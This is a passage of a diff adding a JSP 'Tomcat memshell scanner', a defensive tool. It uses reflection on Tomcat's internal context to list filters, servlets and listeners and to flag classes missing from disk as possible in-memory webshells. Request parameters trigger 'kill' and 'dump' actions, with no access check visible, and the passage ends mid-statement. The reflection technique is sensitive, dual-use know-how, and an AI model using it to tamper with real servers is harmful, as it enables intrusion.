+&lt;/span&gt;&lt;span class="c1"&gt;&lt;/span&gt;                    &lt;span class="n"&gt;Method&lt;/span&gt; &lt;span class="n"&gt;removeChild&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;standardContext&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getClass&lt;/span&gt;&lt;span class="o"&gt;().&lt;/span&gt;&lt;span class="na"&gt;getDeclaredMethod&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;removeChild&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;Class&lt;/span&gt;&lt;span class="o"&gt;[]{&lt;/span&gt;&lt;span class="n"&gt;org&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;apache&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;catalina&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;Container&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;class&lt;/span&gt;&lt;span class="o"&gt;});&lt;/span&gt;
+                    &lt;span class="n"&gt;removeChild&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;setAccessible&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                    &lt;span class="n"&gt;removeChild&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;invoke&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;standardContext&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;objChild&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                &lt;span class="o"&gt;}&lt;/span&gt;
+            &lt;span class="o"&gt;}&lt;/span&gt;
+
+            &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kd"&gt;synchronized&lt;/span&gt; &lt;span class="n"&gt;HashMap&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;Object&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="nf"&gt;getChildren&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;HttpServletRequest&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="kd"&gt;throws&lt;/span&gt; &lt;span class="n"&gt;Exception&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+                &lt;span class="n"&gt;Object&lt;/span&gt; &lt;span class="n"&gt;standardContext&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;getStandardContext&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                &lt;span class="n"&gt;Field&lt;/span&gt; &lt;span class="n"&gt;_children&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;standardContext&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getClass&lt;/span&gt;&lt;span class="o"&gt;().&lt;/span&gt;&lt;span class="na"&gt;getSuperclass&lt;/span&gt;&lt;span class="o"&gt;().&lt;/span&gt;&lt;span class="na"&gt;getDeclaredField&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;children&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                &lt;span class="n"&gt;_children&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;setAccessible&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                &lt;span class="n"&gt;HashMap&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;Object&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;children&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;HashMap&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;Object&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;)&lt;/span&gt; &lt;span class="n"&gt;_children&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;get&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;standardContext&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;children&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
+            &lt;span class="o"&gt;}&lt;/span&gt;
+
+
+            &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kd"&gt;synchronized&lt;/span&gt; &lt;span class="n"&gt;HashMap&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="nf"&gt;getServletMaps&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;HttpServletRequest&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="kd"&gt;throws&lt;/span&gt; &lt;span class="n"&gt;Exception&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+                &lt;span class="n"&gt;Object&lt;/span&gt; &lt;span class="n"&gt;standardContext&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;getStandardContext&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                &lt;span class="n"&gt;Field&lt;/span&gt; &lt;span class="n"&gt;_servletMappings&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;standardContext&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getClass&lt;/span&gt;&lt;span class="o"&gt;().&lt;/span&gt;&lt;span class="na"&gt;getDeclaredField&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;servletMappings&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                &lt;span class="n"&gt;_servletMappings&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;setAccessible&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                &lt;span class="n"&gt;HashMap&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;servletMappings&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;HashMap&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;)&lt;/span&gt; &lt;span class="n"&gt;_servletMappings&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;get&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;standardContext&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;servletMappings&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
+            &lt;span class="o"&gt;}&lt;/span&gt;
+
+            &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kd"&gt;synchronized&lt;/span&gt; &lt;span class="n"&gt;List&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;Object&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="nf"&gt;getListenerList&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;HttpServletRequest&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="kd"&gt;throws&lt;/span&gt; &lt;span class="n"&gt;Exception&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+                &lt;span class="n"&gt;Object&lt;/span&gt; &lt;span class="n"&gt;standardContext&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;getStandardContext&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                &lt;span class="n"&gt;Field&lt;/span&gt; &lt;span class="n"&gt;_listenersList&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;standardContext&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getClass&lt;/span&gt;&lt;span class="o"&gt;().&lt;/span&gt;&lt;span class="na"&gt;getDeclaredField&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;applicationEventListenersList&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                &lt;span class="n"&gt;_listenersList&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;setAccessible&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                &lt;span class="n"&gt;List&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;Object&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;listenerList&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;CopyOnWriteArrayList&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="n"&gt;_listenersList&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;get&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;standardContext&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;listenerList&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
+            &lt;span class="o"&gt;}&lt;/span&gt;
+
+            &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="nf"&gt;getFilterName&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Object&lt;/span&gt; &lt;span class="n"&gt;filterMap&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="kd"&gt;throws&lt;/span&gt; &lt;span class="n"&gt;Exception&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+                &lt;span class="n"&gt;Method&lt;/span&gt; &lt;span class="n"&gt;getFilterName&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;filterMap&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getClass&lt;/span&gt;&lt;span class="o"&gt;().&lt;/span&gt;&lt;span class="na"&gt;getDeclaredMethod&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;getFilterName&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                &lt;span class="n"&gt;getFilterName&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;setAccessible&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="n"&gt;getFilterName&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;invoke&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;filterMap&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+            &lt;span class="o"&gt;}&lt;/span&gt;
+
+            &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="o"&gt;[]&lt;/span&gt; &lt;span class="nf"&gt;getURLPatterns&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Object&lt;/span&gt; &lt;span class="n"&gt;filterMap&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="kd"&gt;throws&lt;/span&gt; &lt;span class="n"&gt;Exception&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+                &lt;span class="n"&gt;Method&lt;/span&gt; &lt;span class="n"&gt;getFilterName&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;filterMap&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getClass&lt;/span&gt;&lt;span class="o"&gt;().&lt;/span&gt;&lt;span class="na"&gt;getDeclaredMethod&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;getURLPatterns&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                &lt;span class="n"&gt;getFilterName&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;setAccessible&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="o"&gt;[])&lt;/span&gt; &lt;span class="n"&gt;getFilterName&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;invoke&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;filterMap&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+            &lt;span class="o"&gt;}&lt;/span&gt;
+
+
+            &lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="nf"&gt;classFileIsExists&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Class&lt;/span&gt; &lt;span class="n"&gt;clazz&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+                &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;clazz&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+                    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="s"&gt;&amp;#34;class is null&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
+                &lt;span class="o"&gt;}&lt;/span&gt;
+
+                &lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="n"&gt;className&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;clazz&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getName&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;
+                &lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="n"&gt;classNamePath&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;className&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;replace&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;.&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;#34;/&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s"&gt;&amp;#34;.class&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
+                &lt;span class="n"&gt;URL&lt;/span&gt; &lt;span class="n"&gt;is&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;clazz&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getClassLoader&lt;/span&gt;&lt;span class="o"&gt;().&lt;/span&gt;&lt;span class="na"&gt;getResource&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;classNamePath&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;is&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+                    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="s"&gt;&amp;#34;在磁盘上没有对应class文件，可能是内存马&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
+                &lt;span class="o"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+                    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;is&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getPath&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;
+                &lt;span class="o"&gt;}&lt;/span&gt;
+            &lt;span class="o"&gt;}&lt;/span&gt;
+
+            &lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="nf"&gt;arrayToString&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="o"&gt;[]&lt;/span&gt; &lt;span class="n"&gt;str&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+                &lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="n"&gt;res&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;#34;[&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
+                &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;str&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+                    &lt;span class="n"&gt;res&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;format&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;%s,&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                &lt;span class="o"&gt;}&lt;/span&gt;
+                &lt;span class="n"&gt;res&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;res&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;substring&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;0&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;res&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;length&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;1&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                &lt;span class="n"&gt;res&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="s"&gt;&amp;#34;]&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
+                &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;res&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
+            &lt;span class="o"&gt;}&lt;/span&gt;
+        &lt;span class="o"&gt;%&amp;gt;&lt;/span&gt;
+
+        &lt;span class="o"&gt;&amp;lt;%&lt;/span&gt;
+            &lt;span class="n"&gt;out&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;write&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;&amp;lt;h2&amp;gt;Tomcat memshell scanner 0.1.0&amp;lt;/h2&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+            &lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="n"&gt;action&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getParameter&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;action&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+            &lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="n"&gt;filterName&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getParameter&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;filterName&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+            &lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="n"&gt;servletName&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getParameter&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;servletName&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+            &lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="n"&gt;className&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getParameter&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;className&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;action&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="n"&gt;action&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;equals&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;kill&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="n"&gt;filterName&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+                &lt;span class="n"&gt;deleteFilter&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;filterName&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+            &lt;span class="o"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;action&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="n"&gt;action&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;equals&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;kill&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="n"&gt;servletName&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+                &lt;span class="n"&gt;deleteServlet&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;servletName&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+            &lt;span class="o"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;action&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="n"&gt;action&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;equals&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;dump&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="n"&gt;className&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+                &lt;span class="kt"&gt;byte&lt;/span&gt;&lt;span class="o"&gt;[]&lt;/span&gt; &lt;span class="n"&gt;classBytes&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Repository&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;lookupClass&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Class&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;forName&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;className&lt;/span&gt;&lt;span class="o"&gt;)).&lt;/span&gt;&lt;span class="na"&gt;getBytes&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;
